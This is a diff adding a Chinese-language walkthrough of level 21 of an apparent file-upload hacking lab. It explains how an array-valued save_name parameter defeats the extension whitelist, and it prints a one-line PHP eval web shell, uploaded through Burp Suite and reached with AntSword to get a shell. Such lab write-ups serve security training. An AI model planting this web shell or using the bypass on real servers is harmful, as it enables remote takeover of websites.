@@ -2497,3 +2497,166 @@ move_uploaded_file()还有这么一个特性，会忽略掉文件末尾的 /.
 + 成功添加数据后双击成功<code>getshell</code>
 
 ![Pass20_09](./img/Pass20_09.PNG)
+
+
+
+## Pass21
+
++ 查看提示
+
+![Pass21_01](./img/Pass21_01.PNG)
+
+
+
++ 查看源代码
+
+~~~ php
+$is_upload = false;
+$msg = null;
+if(!empty($_FILES['upload_file'])){
+    //检查MIME
+    $allow_type = array('image/jpeg','image/png','image/gif');
+    if(!in_array($_FILES['upload_file']['type'],$allow_type)){
+        $msg = "禁止上传该类型文件!";
+    }else{
+        //检查文件名
+        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
+        if (!is_array($file)) {
+            $file = explode('.', strtolower($file));
+        }
+
+        $ext = end($file);
+        $allow_suffix = array('jpg','png','gif');
+        if (!in_array($ext, $allow_suffix)) {
+            $msg = "禁止上传该后缀文件!";
+        }else{
+            $file_name = reset($file) . '.' . $file[count($file) - 1];
+            $temp_file = $_FILES['upload_file']['tmp_name'];
+            $img_path = UPLOAD_PATH . '/' .$file_name;
+            if (move_uploaded_file($temp_file, $img_path)) {
+                $msg = "文件上传成功！";
+                $is_upload = true;
+            } else {
+                $msg = "文件上传失败！";
+            }
+        }
+    }
+}else{
+    $msg = "请选择要上传的文件！";
+}
+~~~
+
+![Pass21_02](./img/Pass21_02.PNG)
+
+
+
++ 原理
+
+~~~ tex
+这一关白名单验证过程：
+--> 验证上传路径是否存在
+--> 验证['upload_file']的content-type是否合法（可以抓包修改）
+--> 判断POST参数是否为空定义$file变量（关键：构造数组绕过下一步的判断）
+--> 判断file不是数组则使用explode('.', strtolower($file))对file进行切割，将file变为一个数组
+
+例如我上传upload.php.jpg，就会返回数组 array(3){[0]=>upload,[1]=>php,[2]=>jpg}
+--> 判断数组最后一个元素是否在白名单中 由于是白名单校验 所以不能利用 $_FILES['upload_file']['name'] 
+--> 数组第一位和$file[count($file) - 1]进行拼接，减1是因为数组下标默认从0开始 最后保存文件名file_name
+--> 上传文件
+~~~
+
+~~~ php
+explode(separator,string[,limit]) 函数，使用一个字符串分割另一个字符串，并返回由字符串组成的数组。
+end(array)函数，输出数组中的当前元素和最后一个元素的值。
+reset(array)函数，把数组的内部指针指向第一个元素，并返回这个元素的值
+count(array)函数，计算数组中的单元数目，或对象中的属性个数
+~~~
+
+
+
++ 实现原理
+
+~~~ tex
+想要绕过白名单上传，很明显需要使end($file)和$file[count($file)-1]指向不同的内容，
+end($file)是合法的后缀用于骗过白名单，而$file[count($file)-1]是实际上传的后缀
+那怎样才能让数组最后一个元素和$file[count($file)-1]不一样呢？
+由于explode函数只能分割字符串 那么用$_POST['save_name']上传一个数组就绕过了这段代码 
+ 
+ 
+$file = empty($_POST['save_name'])?$_FILES['upload_file']['name'] : $_POST['save_name'];
+if (!is_array($file)) {
+	$file = explode('.', strtolower($file));
+}
+
+
+却成为了$file数组那么让数组最后一个元素为合法后缀
+
+array(3){
+['save_name']​​​​​​​[0]=>upload.php
+['save_name']​​​​​​​[2]=>jpg
+}
+正常来说 end($file)=$file[count($file) - 1]  
+但我没有上传下标为['save_name']​​​​​​​[1]=>xxx的数组元素 所以2-1=1 数组元素为空
+那么$file_name = reset($file) . '.' . $file[count($file) - 1]; 保存成了upload.php空字符 也就是upload.php 
+从而实现了绕过白名单
+~~~
+
+
+
++ 编写脚本<code>TwentyOneSecondMethod.php</code>
+
+~~~ php
+<?php
+	@eval($_POST['TwentyOne']);
+?>
+~~~
+
+
+
++ 上传脚本<code>TwentyOneFirstMethod.php</code>到网站并用<code>burpsuite</code>拦截
+
+![Pass21_03](./img/Pass21_03.PNG)
+
+![Pass21_04](./img/Pass21_04.PNG)
+
+
+
++ 修改某些地方
+
+~~~ tex
+我们要改的就是下面的地方
+
+修改content-type 
+修改POST参数为数组类型，索引[0]为`upload-20.php`，索引[2]为`jpg|png|gif`。
+只要第二个索引`不为1`，$file[count($file) - 1]就等价于$file[2-1]，值为空
+~~~
+
+![Pass21_05](./img/Pass21_05.PNG)
+
+
+
++ 放包之后成功上传文件
+
+![Pass21_06](./img/Pass21_06.png)
+
+
+
++ 右键打开上传文件的地址并复制地址
+
+![Pass21_07](./img/Pass21_07.png)
+
+![Pass21_08](./img/Pass21_08.png)
+
+
+
++ 蚁剑添加数据并配置，<code>URL地址</code>指之前上传文件的地址，连接密码根据之前编辑的脚本确定
+
+![Pass21_09](./img/Pass21_09.png)
+
+
+
++ 成功配置数据后添加数据成功，双击后成功<code>getshell</code>
+
+![Pass21_10](./img/Pass21_10.PNG)
+
+![Pass21_11](./img/Pass21_11.PNG)
